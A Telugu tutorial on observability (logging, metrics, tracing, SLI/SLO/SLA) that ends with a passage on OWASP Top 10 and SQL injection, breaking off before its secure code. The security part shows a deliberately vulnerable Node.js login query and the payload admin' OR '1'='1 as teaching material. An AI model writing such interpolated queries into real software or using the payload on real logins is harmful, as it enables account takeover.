మైక్రోసర్వీసెస్ మరియు క్లౌడ్ ఆర్కిటెక్చర్‌లో వందలాది సర్వర్లు రన్ అవుతున్నప్పుడు, వాటి లోపల ఏ సర్వీస్ ఏ లాగ్స్ (Logs) జనరేట్ చేస్తుందో ట్రాక్ చేయడం ఒక పెద్ద టాస్క్. ప్రతి సర్వర్‌లోకి లాగిన్ అయి విడివిడిగా టెక్స్ట్ ఫైల్స్ చదవడం అసాధ్యం.

అందుకే అన్ని సర్వర్ల లాగ్స్‌ని ఒకే చోటికి చేర్చి, వాటిని సెర్చ్ చేయడానికి మరియు అనలైజ్ చేయడానికి ఉపయోగించే లేటెస్ట్ లేయర్ **Centralized Logging & Observability**. ఇందులో ఇండస్ట్రీ స్టాండర్డ్స్ అయిన **Fluent Bit**, **ELK Stack**, మరియు **OpenSearch** ల గురించి మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Centralized Logging Architecture (లాగ్స్ ప్రయాణం)

ఒక ప్రొఫెషనల్ లాగింగ్ సిస్టమ్ లోపల డేటా మూడు ముఖ్యాంశాల ద్వారా ప్రయాణిస్తుంది:

1. **Shipper/Collector (కలెక్టర్):** సర్వర్ల లోపల కూర్చుని లాగ్స్ ఏరి పంపేది.
2. **Storage/Indexer (నిధి):** వచ్చిన లాగ్స్ అన్నింటినీ దాచుకుని, ఇండెక్స్ చేసేది.
3. **Visualization (స్క్రీన్):** ఆ లాగ్స్‌ని మనకు అందమైన గ్రాఫ్‌లు, చార్ట్‌ల రూపంలో చూపించేది.

---

## 2. Fluent Bit (ది లైట్-వైట్ కలెక్టర్)

- **What it is:** ఇది ఒక అత్యంత వేగవంతమైన, అల్ట్రా లైట్-వైట్ **Log Shipper & Processor**. దీన్ని C లాంగ్వేజ్‌లో రాశారు.
- **Role:** మీ క్లస్టర్‌లోని ప్రతి కంప్యూటర్ (Node) లో లేదా ప్రతి డాకర్ కంటైనర్ పక్కన ఇది ఒక **Sidecar** లాగా రన్ అవుతుంది. సర్వర్లు జనరేట్ చేసే లాగ్స్ అన్నింటినీ ఇది సేకరిస్తుంది (Collect చేస్తుంది).
- **Why it's a massive upgrade:** దీనికంటే ముందు _Logstash_ లేదా _Fluentd_ వాడేవారు, కానీ అవి రన్ అవ్వడానికి చాలా మెమరీ (RAM) తినేసేవి. Fluent Bit కేవలం కొన్ని MB ల రామ్ మాత్రమే తీసుకుంటూ, లక్షలాది లాగ్స్ ని క్షణాల్లో ఫిల్టర్ చేసి, సెంట్రల్ డేటాబేస్ కి (OpenSearch/Kafka) కి పుష్ చేయగలదు.

---

## 3. ELK Stack vs OpenSearch (లాగ్స్ సామ్రాజ్యం)

లాగ్స్ అన్నింటినీ ఒకే చోట దాచి, వాటిపై గూగుల్ సెర్చ్ లాగా వెతకడానికి వాడే మోస్ట్ పాపులర్ టెక్నాలజీస్ ఇవి.

### 🦌 ELK Stack (The Classic Way)

ఇది మూడు ఓపెన్ సోర్స్ టూల్స్ యొక్క కలయిక:

1. **E - Elasticsearch:** ఒక భారీ NoSQL సెర్చ్ ఇంజన్. వచ్చిన లాగ్స్ అన్నింటినీ ఇది లోపల దాచుకుంటుంది. మనం ఏ ఎర్రర్ కోసం వెతికినా మిల్లీసెకన్లలో చూపిస్తుంది.
2. **L - Logstash:** లాగ్స్ ని ప్రాసెస్ చేసి, క్లీన్ చేసే మిక్సీ లాంటిది (ప్రస్తుతం దీని స్థానంలో _Fluent Bit_ వాడుతున్నారు).
3. **K - Kibana:** ఇది ఒక అద్భుతమైన UI డాష్‌బోర్డ్. ఎలాస్టిక్‌సెర్చ్ లో ఉన్న లాగ్స్ ని స్క్రీన్ పై గ్రాఫ్‌లు, లైన్ చార్ట్‌ల రూపంలో చూపిస్తుంది. "ఈరోజు యాప్‌లో ఎన్ని `500 Errors` వచ్చాయి" అని విజువల్ గా చూడవచ్చు.

### 🔎 OpenSearch (The Modern Cloud-Native Upgrade)

- **The Story (Why it evolved):** 2021 లో Elasticsearch సంస్థ తమ లైసెన్స్ రూల్స్ మార్చింది (పూర్తిగా ఫ్రీ ఓపెన్ సోర్స్ కాకుండా చేసింది). అది నచ్చని **AWS (Amazon)** మరియు మిగతా పెద్ద కంపెనీలు కలిసి, పాత ఓపెన్ సోర్స్ ఎలాస్టిక్‌సెర్చ్ కోడ్‌ని తీసుకుని ఒక సరికొత్త ఫ్రీ & ఓపెన్ సోర్స్ వెర్షన్‌ని క్రియేట్ చేశారు. దాన్నే **OpenSearch** అంటారు.
- **Components:** ఇందులో కూడా ఎలాస్టిక్‌సెర్చ్ లాగే **OpenSearch Engine** (డేటా దాచడానికి) మరియు కిబానా లాగే **OpenSearch Dashboards** (విజువలైజేషన్ కోసం) ఉంటాయి.
- **Why it's preferred now:** ప్రస్తుతం క్లౌడ్ ఆర్కిటెక్చర్‌లో, ముఖ్యంగా AWS లోపల **Amazon OpenSearch Service** అత్యంత ప్రజాదరణ పొందింది. ఇది కంప్లీట్లీ మేనేజ్డ్, సెక్యూర్ మరియు 100% ఓపెన్ సోర్స్.

---

## 📌 ఒక కంప్లీట్ లాగిన్ పైప్‌లైన్ (రియల్-వరల్డ్ ఫ్లో)

మీరు ఒక మైక్రోసర్వీసెస్ యాప్ బిల్డ్ చేస్తే, దాని లాగింగ్ ఆర్కిటెక్చర్ ఇలా ఉంటుంది:

```text
 [ Docker Containers ] ──► (Generates Logs)
         │
         ▼
   [ Fluent Bit ]       ──► (Collects, parses & filters logs)
         │
         ▼
  [ Apache Kafka ]      ──► (Buffer layer - prevents backend crash during traffic spikes)
         │
         ▼
   [ OpenSearch ]       ──► (Stores & Indexes logs for fast searching)
         │
         ▼
[ OpenSearch Dashboard ]──► (Developers view logs and create production charts)

```

---

ఒక అప్లికేషన్‌ను నిరంతరం గమనించడానికి (Observability) లాగ్స్ ఎంత ముఖ్యమో, సిస్టమ్ యొక్క ఆరోగ్యాన్ని (Health), వేగాన్ని (Performance) సంఖ్యల రూపంలో కొలవడం కూడా అంతే ముఖ్యం. దీనినే **Metrics Monitoring & Alerting** అంటారు.

మీ అప్లికేషన్ సెకనుకి ఎన్ని రిక్వెస్ట్‌లు హ్యాండిల్ చేస్తోంది, రామ్ (RAM) ఎంత వాడుతోంది, ఎక్కడైనా ఏపీఐ లాటెన్సీ (Delay) పెరుగుతుందా అని లైవ్ గ్రాఫ్‌ల రూపంలో చూపిస్తూ, ఏదైనా తేడా వస్తే అర్ధరాత్రి అయినా సరే అలర్ట్ చేసే మోస్ట్ పవర్‌ఫుల్ మానిటరింగ్ టూల్స్ ఇవి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, కంపేర్ చేస్తూ తెలుగులో నేర్చుకుందాం.

---

## 1. Prometheus + Grafana (ది ఓపెన్ సోర్స్ పవర్ కపుల్)

ఇండస్ట్రీలో ముఖ్యంగా కుబెర్నెటిస్ (Kubernetes) మరియు మైక్రోసర్వీసెస్ వాడుతున్నప్పుడు ఈ రెండింటి కాంబినేషన్‌ని ఒక డెడ్లీ కాంబోలా చూస్తారు.

### 🔥 Prometheus (డేటా కలెక్టర్ & టైమ్-సిరీస్ నిధి)

- **What it is:** ఇది ఒక ఓపెన్ సోర్స్ మానిటరింగ్ మరియు అలర్టింగ్ టూల్. ఇది డేటాని **Time-Series Database (TSDB)** లో దాచుకుంటుంది (అంటే ప్రతి సెకనుకి సిస్టమ్ స్టేట్ ఎలా ఉందో టైమ్‌స్టాంప్‌తో సహా దాస్తుంది).
- **How it works (Pull Model):** సాధారణంగా మానిటరింగ్ టూల్స్ మన యాప్ నుండి డేటాని పంపాలి (Push). కానీ ప్రొమేథియస్ ఉల్టాగా పనిచేస్తుంది. ఇది ప్రతి 15 సెకన్లకి మీ మైక్రోసర్వీసెస్ దగ్గరికి స్వయంగా వెళ్లి, "నీ కరెంట్ హెల్త్ ఏంటి, ఎన్ని రిక్వెస్ట్‌లు వచ్చాయి" అని డేటాని లాక్కుంటుంది (**Scraping / Pull Model**).
- **PromQL:** ఇందులో డేటాని క్వెరీ చేయడానికి ఒక పవర్‌ఫుల్ లాంగ్వేజ్ ఉంటుంది. (ఉదా: "గత 5 నిమిషాలుగా `/checkout` ఏపీఐ కి వచ్చిన 500 ఎర్రర్స్ రేట్ ఎంత?").

### 📊 Grafana (ది బ్యూటిఫుల్ డాష్‌బోర్డ్)

- **What it is:** ప్రొమేథియస్ కేవలం డేటాని కలెక్ట్ చేసి బ్యాక్‌గ్రౌండ్‌లో దాచగలదు, కానీ దానికి అందమైన UI లేదు. అందుకే దాని ముందు **Grafana** ని పెడతాం.
- **Role:** ఇది ప్రొమేథియస్ లోని డేటాని రీడ్ చేసి, కళ్ళకు కట్టినట్లు అత్యంత అద్భుతమైన లైవ్ గ్రాఫ్‌లు, చార్ట్‌లు, మరియు హీట్‌మ్యాప్స్ (Heatmaps) లాంటి డాష్‌బోర్డ్‌లను క్రియేట్ చేస్తుంది. ప్రొడక్షన్ రూమ్‌లలో ఉండే పెద్ద స్క్రీన్లపై కనిపించే డాష్‌బోర్డ్‌లు ఇవే!

---

## 2. CloudWatch vs Datadog (క్లౌడ్ మరియు ఎంటర్‌ప్రైజ్ జెయింట్స్)

మీరు ఓపెన్ సోర్స్ టూల్స్‌ని సొంతంగా మెయింటైన్ చేసే తలనొప్పి వద్దు అనుకుంటే, ఈ కమర్షియల్/మేనేజ్డ్ ఆప్షన్స్ కి వెళ్ళవచ్చు.

### ☁️ Amazon CloudWatch (AWS ఇన్-బిల్ట్ గార్డ్)

- **What it is:** మనం క్లౌడ్ చాప్టర్ లో చూసినట్లు, ఇది AWS వాళ్ళ సొంత మానిటరింగ్ సర్వీస్.
- **Pros:** మీరు AWS లో ఒక EC2 లేదా Lambda క్రియేట్ చేయగానే, ఏ విధమైన అదనపు సెటప్ లేకుండా ఆటోమేటిక్‌గా డేటా క్లౌడ్‌వాచ్‌కి వెళ్ళిపోతుంది. AWS సర్వీసెస్ యొక్క ఇన్‌ఫ్రాస్ట్రక్చర్ మెట్రిక్స్ (CPU, Memory, Disk I/O) కి ఇది బెస్ట్.
- **Cons:** దీని UI గ్రాఫానా లేదా డేటాడాగ్ అంత అడ్వాన్స్‌డ్ గా ఉండదు. అలాగే నాన్-AWS (ఉదాహరణకు మీ ఆన్-ప్రిమిస్ సర్వర్లు) మానిటర్ చేయడం కొంచెం కాంప్లెక్స్.

### 🐕 Datadog (ది అల్టిమేట్ APM - SaaS కింగ్)

- **What it is:** ఇది ప్రస్తుతం మార్కెట్లో ఉన్న అత్యంత ప్రజాదరణ పొందిన, పవర్‌ఫుల్ **SaaS (Software-as-a-Service) Monitoring Platform**.
- **Why it's a beast:** దీన్ని **APM (Application Performance Monitoring)** అంటారు. ఇది కేవలం సర్వర్ హెల్త్ మాత్రమే కాదు, మీ కోడ్ లోపల ఏ ఫంక్షన్ స్లోగా రన్ అవుతుంది, ఏ డేటాబేస్ క్వెరీ ఎక్కువ టైమ్ తీసుకుంటుంది అనే లెవెల్ వరకు డీప్ గా స్కాన్ చేస్తుంది.
- **All-in-One:** డేటాడాగ్ లోపల మెట్రిక్స్, లాగ్స్ (ELK లాగా), ట్రేసెస్ (X-Ray లాగా), మరియు సెక్యూరిటీ మానిటరింగ్ అన్నీ ఒకే ఒక్క స్క్రీన్ పై కనిపిస్తాయి.
- **The Catch:** ఇది చాలా ఖరీదైనది (Very Expensive). పెద్ద పెద్ద ఎంటర్‌ప్రైజ్ కంపెనీలు మాత్రమే దీని బిల్లును భరించగలవు.

---

## 📌 క్విక్ సమ్మరీ (ఏది ఎప్పుడు వాడాలి?):

| టూల్                     | రకం                  | బెస్ట్ యూజ్ కేస్                                                                                     |
| ------------------------ | -------------------- | ---------------------------------------------------------------------------------------------------- |
| **Prometheus + Grafana** | ఓపెన్ సోర్స్ (ఉచితం) | కుబెర్నెటిస్ (Kubernetes) క్లస్టర్స్ మరియు కస్టమ్ మైక్రోసర్వీసెస్ మెట్రిక్స్ కి పర్ఫెక్ట్.           |
| **AWS CloudWatch**       | క్లౌడ్-నేటివ్ (AWS)  | AWS ఇన్‌ఫ్రాస్ట్రక్చర్ (EC2, RDS, Lambda) ని సింపుల్ గా మానిటర్ చేయడానికి.                           |
| **Datadog**              | ప్రీమియం SaaS (Paid) | ఖర్చుతో సంబంధం లేదు, ఒకే చోట మెట్రిక్స్, లాగ్స్, కోడ్ పర్ఫార్మెన్స్ అన్నీ అల్టిమేట్ గా కావాలనుకుంటే. |

---

అబ్సర్వబిలిటీ (Observability) ప్రపంచంలో మూడో మరియు అత్యంత కీలకమైన స్తంభం (Third Pillar) **Distributed Tracing**. మనం ఆల్రెడీ లాగ్స్ (Logs), మెట్రిక్స్ (Metrics) చూశాం. కానీ ఒక రిక్వెస్ట్ వందలాది మైక్రోసర్వీసెస్ గుండా ప్రయాణిస్తున్నప్పుడు, అసలు బగ్ ఎక్కడ ఉందో పట్టుకోవడానికి ఈ ట్రేసింగ్ టూల్స్ వాడతాం.

ఇండస్ట్రీ స్టాండర్డ్ అయిన **OpenTelemetry**, మరియు పాపులర్ ట్రేసింగ్ ఇంజన్లు అయిన **Jaeger**, **Zipkin**, **AWS X-Ray** ల గురించి మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. కోర్ కాన్సెప్ట్స్ (ట్రేసింగ్ ఎలా పని చేస్తుంది?)

ట్రేసింగ్‌లో రెండు ముఖ్యమైన పదాలు ఉంటాయి:

- **Span (స్ప్యాన్):** ఒక నిర్దిష్టమైన సర్వీస్ లోపల జరిగిన పని యొక్క సమయం (ఉదాహరణకు: `Payment-Service` లోపల ఒక SQL క్వెరీ రన్ అవ్వడానికి పట్టిన 40ms సమయం ఒక స్ప్యాన్).
- **Trace (ట్రేస్):** ఒక యూజర్ రిక్వెస్ట్ స్టార్ట్ అయినప్పటి నుండి ఎండ్ అయ్యే వరకు, అన్ని సర్వీసెస్ లోపల క్రియేట్ అయిన `Spans` అన్నింటి కలయికే ఒక ట్రేస్.

---

## 2. OpenTelemetry (ది గ్లోబల్ స్టాండర్డ్ - మార్కెట్ లీడర్)

- **What it is:** ఇది ఒక ఓపెన్ సోర్స్ ప్రాజెక్ట్ (CNCF కింద ఉంటుంది). ఇది ఏ ఒక్క ట్రేసింగ్ టూల్ కాదు, ఇది ఒక **గ్లోబల్ స్టాండర్డ్ / ఫ్రేమ్‌వర్క్**.
- **Why it's a massive upgrade:** పూర్వ కాలంలో మీరు Jaeger వాడాలి అంటే మీ కోడ్‌లో Jaeger లైబ్రరీస్ ఇన్స్టాల్ చేయాలి, ఒకవేళ భవిష్యత్తులో Datadog కి మారాలి అంటే మళ్ళీ కోడ్ అంతా మార్చాల్సి వచ్చేది (Vendor Lock-in).
- **The Solution:** ఓపెన్ టెలిమెట్రీ (**OTel**) ఒక కామన్ నియామకం తెచ్చింది. మీ కోడ్ లో OTel SDK ని పెడితే చాలు, అది డేటాని కలెక్ట్ చేస్తుంది. ఆ డేటాని మీరు ఏ టూల్ కైనా (Jaeger, Zipkin, or Datadog) కోడ్ మార్చకుండా పంపుకోవచ్చు (**Collect Once, Send Anywhere**).

---

## 3. Tracing Engines (డేటాని దాచి, విజువలైజ్ చేసేవి)

OpenTelemetry కలెక్ట్ చేసిన ట్రేస్ డేటాని విశ్లేషించడానికి కింద ఉన్న ఇంజన్లలో ఒకదానికి పంపుతాం:

### 🎖️ Jaeger (ది మోడర్న్ కింగ్)

- **What it is:** ఉబెర్ (Uber) సంస్థ బిల్డ్ చేసి, ఆ తర్వాత ఓపెన్ సోర్స్ చేసిన అత్యంత ప్రజాదరణ పొందిన డిస్ట్రిబ్యూటెడ్ ట్రేసింగ్ సిస్టమ్.
- **Why it's great:** దీని UI చాలా అద్భుతంగా ఉంటుంది. ఒక రిక్వెస్ట్ ఏ ఏ సర్వీస్ ల గుండా వెళ్ళింది, ఎక్కడ ఎంత సమయం పట్టింది అనేది ఒక టైమ్‌లైన్ బార్ గ్రాఫ్ రూపంలో కళ్ళకు కట్టినట్లు చూపిస్తుంది. ప్రస్తుతం మోడర్న్ కుబెర్నెటిస్ ఆర్కిటెక్చర్లలో దీన్నే ఎక్కువగా వాడుతున్నారు.

### 📜 Zipkin (ది పయనీర్)

- **What it is:** ట్విట్టర్ (Twitter) సంస్థ డిజైన్ చేసిన అత్యంత పాత, క్లాసిక్ ట్రేసింగ్ టూల్ (ఇది గూగుల్ వాళ్ళ _Dapper_ పేపర్ ఆధారంగా బిల్డ్ చేయబడింది).
- **Status today:** జిప్కిన్ చాలా కాలంగా ఉంది, నమ్మకమైంది, కానీ దీని UI మరియు ఫీచర్స్ Jaeger అంత మోడర్న్ గా ఉండవు. అయినా కూడా చాలా పాత జావా/స్プリング బూట్ అప్లికేషన్స్ లో ఇప్పటికీ ఇది కనిపిస్తూ ఉంటుంది.

### ☁️ AWS X-Ray (క్లౌడ్-నేటివ్ ట్రేసర్)

- **What it is:** మనం మునుపటి క్లౌడ్ అధ్యాయంలో చూసినట్లు, ఇది AWS వాళ్ళ సొంత మేనేజ్డ్ ట్రేసింగ్ సర్వీస్.
- **Best use:** మీ అప్లికేషన్ కంప్లీట్ గా AWS లో (EC2, ECS, Lambda, API Gateway, DynamoDB) రన్ అవుతుంటే, X-Ray చాలా ఈజీగా వాటన్నింటినీ ఆటో-డిస్కవర్ చేసి ఒక **Service Map** క్రియేట్ చేస్తుంది. విడిగా ఎలాంటి ఇన్‌ఫ్రాస్ట్రక్చర్ మెయింటైన్ చేయాల్సిన అవసరం లేదు.

---

## 📌 ట్రేసింగ్ యొక్క రియల్-వరల్డ్ ఫ్లో (OTel + Jaeger)

```text
 [ User Request ] ──► [ Order Service ] ──► [ Payment Service ]
                             │                      │
                             ▼ (OTel SDK)           ▼ (OTel SDK)
                      [ Collects Spans & Trace ID ]
                             │
                             ▼ (Export via OTel Protocol)
                      [ OpenTelemetry Collector ]
                             │
                             ▼ (Stores & Indexes)
                      [ Jaeger / AWS X-Ray ] ──► (Developers view timelines & fixes bugs)

```

---

### 📌 అబ్సర్వబిలిటీ సమ్మరీ (The Three Pillars Summary):

1. **Metrics (Prometheus/Grafana):** సిస్టమ్‌లో సమస్య ఉందని చెప్తుంది (ఉదా: "CPU లోడ్ 95% దాటింది, యాప్ స్లో అయింది!").
2. **Tracing (OpenTelemetry/Jaeger):** ఆ సమస్య ఏ సర్వీస్ లో, ఏ లైన్ వల్ల వస్తుందో ఖచ్చితంగా లొకేషన్ చూపిస్తుంది (ఉదా: "Payment Service లోని `/charge` ఏపీఐ లో 2.5s లేట్ అయింది!").
3. **Logging (OpenSearch/ELK):** ఆ లొకేషన్ లో అసలు ఏం జరిగిందో పూర్తి హిస్టరీని డైరీ రూపంలో చూపిస్తుంది (ఉదా: "NullPointerException: Database Connection Timeout!").

---

మెట్రిక్స్ (Metrics) మరియు అబ్సర్వబిలిటీ ప్రపంచంలో చివరి మరియు అత్యంత ప్రాధాన్యత కలిగిన కాన్సెప్ట్స్ ఇవి. మనం ప్రొమేథియస్, గ్రాఫానా లాంటి టూల్స్ వాడి మెట్రిక్స్ కలెక్ట్ చేయడం సరే, కానీ అసలు **ఏ మెట్రిక్స్ ని గమనించాలి (Frameworks)** మరియు వ్యాపార పరంగా మన అప్లికేషన్ పర్ఫార్మెన్స్ ఎలా ఉండాలి అని **టార్గెట్స్ (SRE Concepts)** ఎలా సెట్ చేసుకోవాలి అనేది ఇవి వివరిస్తాయి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Monitoring Frameworks (ఏం గమనించాలి?)

సిస్టమ్స్ ని మానిటర్ చేయడానికి ఇండస్ట్రీలో రెండు ప్రసిద్ధ ఫ్రేమ్‌వర్క్‌లు ఉన్నాయి. ఇవి దేన్ని ఎప్పుడు వాడాలో చెప్తాయి.

### 🔴 RED Method (యాప్స్ మరియు ఏపీఐ ల కోసం)

ఇది ముఖ్యంగా **మైక్రోసర్వీసెస్, వెబ్ అప్లికేషన్స్, మరియు APIs** ని మానిటర్ చేయడానికి వాడే బెస్ట్ పద్ధతి. దీనిని టామ్ విల్కీ (Tom Wilkie) డిజైన్ చేశారు.

- **R - Rate (వేగం):** సెకనుకి మీ యాప్‌కి ఎన్ని రిక్వెస్ట్‌లు వస్తున్నాయి (`Requests per second - RPS`).
- **E - Errors (తప్పులు):** వచ్చే రిక్వెస్ట్ లలో ఎన్ని ఫెయిల్ అవుతున్నాయి (ఉదా: `500 Internal Server Error` రేట్ ఎంత?).
- **D - Duration (సమయం):** ఒక రిక్వెస్ట్ కి రెస్పాన్స్ ఇవ్వడానికి మీ యాప్ ఎంత సమయం తీసుకుంటుంది (Latency/Duration).

### ⚙️ USE Method (ఇన్‌ఫ్రాస్ట్రక్చర్ మరియు హార్డ్‌వేర్ కోసం)

ఇది మీ సర్వర్ల యొక్క హార్డ్‌వేర్ వనరులను (**CPU, RAM, Hard Disk, Network**) మానిటర్ చేయడానికి వాడే పద్ధతి. దీనిని బ్రెండన్ గ్రెగ్ (Brendan Gregg) డిజైన్ చేశారు.

- **U - Utilization (వినియోగం):** మీ సర్వర్ లోని ఒక రిసోర్స్ (ఉదా: CPU) ఎంత శాతం వాడబడుతోంది (ఉదా: `CPU Utilization: 75%`).
- **S - Saturation (భారం):** రిసోర్స్ నిండా నిండిపోయి, ఇంకా ఎంత పని క్యూ (Queue) లో వెయిట్ చేస్తోంది (ఉదా: రామ్ నిండిపోవడం వల్ల ప్రాసెస్ లు క్యూలో వెయిట్ చేయడం).
- **E - Errors (ఎర్రర్స్):** హార్డ్‌వేర్ లెవెల్ లో ఏవైనా ఎర్రర్స్ జరుగుతున్నాయా (ఉదా: `Device I/O errors` లేదా డ్రాప్ అయిన నెట్‌వర్క్ ప్యాకెట్లు).

---

## 2. SRE Core Concepts (SLI vs SLO vs SLA)

ఒక సాఫ్ట్‌వేర్ పక్కాగా నడుస్తోందా లేదా అని బిజినెస్ మరియు ఇంజనీరింగ్ టీమ్స్ కొలవడానికి వాడే **Site Reliability Engineering (SRE)** టెర్మినాలజీస్ ఇవి.

```text
 [ SLI: వాస్తవం ]  ──►  [ SLO: టార్గెట్ ]  ──►  [ SLA: లీగల్ అగ్రిమెంట్ ]
  (మా కరెంట్ స్పీడ్      (మా స్పీడ్ కచ్చితంగా        (స్పీడ్ తగ్గితే క్లయింట్ కి
     200ms ఉంది)           300ms లోపే ఉండాలి)          పెనాల్టీ కడతాం)

```

### 📊 SLI (Service Level Indicator - వాస్తవం)

- **What it is:** మీ సిస్టమ్ యొక్క కరెంట్ పర్ఫార్మెన్స్ ని ఖచ్చితంగా కొలిచే ఒక అంకె/మెట్రిక్. ఇది ప్రస్తుతం సర్వర్‌లో జరుగుతున్న **నిజం (Fact)**.
- **Example:** "గత 1 గంటలో వచ్చిన రిక్వెస్ట్‌లలో **99% రిక్వెస్ట్‌ల లాటెన్సీ 200ms లోపే ఉంది**."

### 🎯 SLO (Service Level Objective - మన టార్గెట్)

- **What it is:** ఇంజనీరింగ్ టీమ్ తమకు తాము పెట్టుకునే ఒక **లక్ష్యం లేదా టార్గెట్**. మన సిస్టమ్ ఎంతవరకు రిలయబుల్ గా ఉండాలి అని ఇది డిసైడ్ చేస్తుంది.
- **Example:** "మన యాప్ యొక్క లాటెన్సీ ప్రతి నెలలోనూ **కచ్చితంగా 99.5% సమయం 300ms లోపే ఉండాలి**." (ఒకవేళ కరెంట్ SLI ఈ SLO కంటే దాటితే, డెవలపర్లు కొత్త ఫీచర్స్ ఆపి బగ్స్ ఫిక్స్ చేయడం స్టార్ట్ చేస్తారు).

### 📜 SLA (Service Level Agreement - లీగల్ ఒప్పందం)

- **What it is:** మీ కంపెనీకి మరియు మీ క్లయింట్/యూజర్లకి మధ్య జరిగే ఒక **లీగల్ కాంట్రాక్ట్ లేదా ఒప్పందం**.
- **The Catch:** ఒకవేళ మీ సిస్టమ్ ఆ ఒప్పందాన్ని పాటించకపోతే (Downtime వస్తే), మీ కంపెనీ క్లయింట్ కి డబ్బులు రీఫండ్ చేయాల్సి వస్తుంది లేదా **పెనాల్టీ (Penalty)** కట్టాల్సి ఉంటుంది. సాధారణంగా SLA అనేది SLO కంటే కొంచెం తక్కువగా (ఎక్కువ మార్జిన్ తో) ఉంటుంది.
- **Example:** AWS మనకు "99.99% అప్‌టైమ్ ఇస్తాం, ఒకవేళ అంతకంటే తగ్గితే మీ బిల్లులో 20% డిస్కౌంట్ ఇస్తాం" అని చెప్పడం ఒక SLA.

---

### 📌 ఒక్క ముక్కలో తేడా:

- **SLI:** నేను ప్రస్తుతం ఎంత వేగంతో పరిగెడుతున్నాను (Measurement).
- **SLO:** నేను ఎంత వేగంతో పరిగెత్తాలి అని మా కోచ్ పెట్టిన టార్గెట్ (Target).
- **SLA:** నేను ఆ వేగంతో పరిగెత్తకపోతే నా స్పాన్సర్ కి నేను కట్టాల్సిన జరిమానా (Contract).

---

# 13: Security

అద్భుతం! రోడ్‌మ్యాప్ ఇక్కడితో అయిపోలేదు, సాఫ్ట్‌వేర్ ఇంజనీరింగ్‌లో అత్యంత కీలకమైన **చాప్టర్ 13: Security** కి అడుగుపెట్టాం. ఒక సిస్టమ్ ఎంత ఫాస్ట్ గా రన్ అవుతుంది, ఎంత బాగా స్కేల్ అవుతుంది అనేది ఎంత ముఖ్యమో... అది హ్యాకర్ల బారిన పడకుండా ఎంత సెక్యూర్ గా ఉందనేది అంతే ముఖ్యం.

ఈ రోజు సెక్యూరిటీ ప్రపంచంలో బైబిల్ లాంటి **OWASP Top 10** మరియు అందులో మోస్ట్ డేంజరస్ బగ్ అయిన **SQL Injection (SQLi)** గురించి మన స్టైల్‌లో, ప్రాక్టికల్ కోడ్ ఎగ్జాంపుల్స్‌తో తెలుగులో నేర్చుకుందాం.

---

## 1. OWASP Top 10 అంటే ఏమిటి?

- **What it is:** **OWASP** అంటే _Open Worldwide Application Security Project_. ఇది ఒక నాన్-ప్రాఫిట్ ఆర్గనైజేషన్.
- **Role:** వీరు ప్రపంచవ్యాప్తంగా జరుగుతున్న సైబర్ ఎటాక్స్ మరియు వెబ్ అప్లికేషన్లలో వచ్చే లోపాలను (Vulnerabilities) నిరంతరం రీసెర్చ్ చేస్తారు. ప్రతి కొన్ని సంవత్సరాలకు ఒకసారి, వెబ్ అప్లికేషన్లను వేధిస్తున్న **టాప్ 10 అత్యంత ప్రమాదకరమైన సెక్యూరిటీ రిస్క్‌ల** జాబితాను విడుదల చేస్తారు.
- **Why it matters:** ఒక సాఫ్ట్‌వేర్ ఆర్కిటెక్ట్ లేదా డెవలపర్ గా మనం రాసే కోడ్ ఈ 10 రకాల ఎటాక్స్ కి లొంగకుండా సెక్యూర్ గా ఉందో లేదో చెక్ చేసుకోవడం ఒక స్టాండర్డ్ ప్రాక్టీస్.

---

## 2. SQL Injection (SQLi) అంటే ఏంటి?

ఇది దశాబ్దాలుగా వెబ్ ప్రపంచాన్ని భయపెడుతున్న ఒక క్లాసిక్ మరియు అత్యంత వినాశకరమైన ఎటాక్.

- **The Core Concept:** యూజర్ ఇచ్చే ఇన్‌పుట్ (Input) ని సరిగ్గా చెక్ చేయకుండా (Sanitize చేయకుండా), డైరెక్ట్‌గా మన డేటాబేస్ క్వెరీలో కలపడం వల్ల ఈ బగ్ వస్తుంది.
- **The Attack:** హ్యాకర్లు నార్మల్ యూజర్‌నేమ్, పాస్‌వర్డ్‌లకు బదులుగా... చాకచక్యంగా కొన్ని **SQL కమాండ్స్‌ని ఇన్‌పుట్ రూపంలో పంపుతారు**. మీ బ్యాకెండ్ కోడ్ ఆ ఇన్‌పుట్‌ని నమ్మి డేటాబేస్‌లో రన్ చేయడంతో, హ్యాకర్లు మీ డేటాబేస్ మొత్తాన్ని దొంగిలించడం లేదా డిలీట్ చేయడం జరుగుతుంది.

---

## 📌 రియల్-వరల్డ్ ఉదాహరణ (కోడ్ లెవెల్ లో)

మీరు Node.js (Express) మరియు ఒక రిలేషనల్ డేటాబేస్ (SQL) వాడుతున్నారని అనుకుందాం.

### ❌ అభద్రతా కోడ్ (Vulnerable Code - దొంగకి తాళాలు ఇవ్వడం)

ఒక యూజర్ లాగిన్ అవుతున్నప్పుడు మీరు బ్యాకెండ్‌లో కోడ్ ఇలా రాశారు:

```javascript
// హ్యాకర్ input: admin' OR '1'='1
const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`;

db.execute(query);
```

**ఇక్కడ ఏం జరుగుతుంది?**
ఒక సాధారణ యూజర్ అయితే `username: "john"` అని ఇస్తాడు. క్వెరీ పర్ఫెక్ట్ గా పనిచేస్తుంది. కానీ ఒక హ్యాకర్ యూజర్‌నేమ్ బాక్స్‌లో `admin' OR '1'='1` అని టైప్ చేశాడు. అప్పుడు డేటాబేస్ లోపల క్వెరీ ఇలా మారిపోతుంది:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';

```

SQL లో `'1'='1'` అనేది ఎప్పటికీ **TRUE** (నిజం). దీనివల్ల పాస్‌వర్డ్ తప్పు అయినా సరే, క్వెరీ సక్సెస్ అయిపోయి హ్యాకర్ నేరుగా అడ్మిన్ అకౌంట్ లోకి లాగిన్ అయిపోతాడు!

---

### సురక్షితమైన కోడ్ (Secure Code - తాళం గట్టిగా వేయడం)

దీన్ని ఆపడానికి ఇండస్ట్రీలో వాడే బెస్ట్ టెక్నిక్ **Parameterized Queries (Prepared Statements)**.

```javascript
// ఇక్కడ '?' వాడతాం, దీనివల్ల డ్రైవర్ దీన్ని కేవలం ఒక Plain Text లాగే చూస్తుంది తప్ప SQL కమాండ్ లా చూడదు
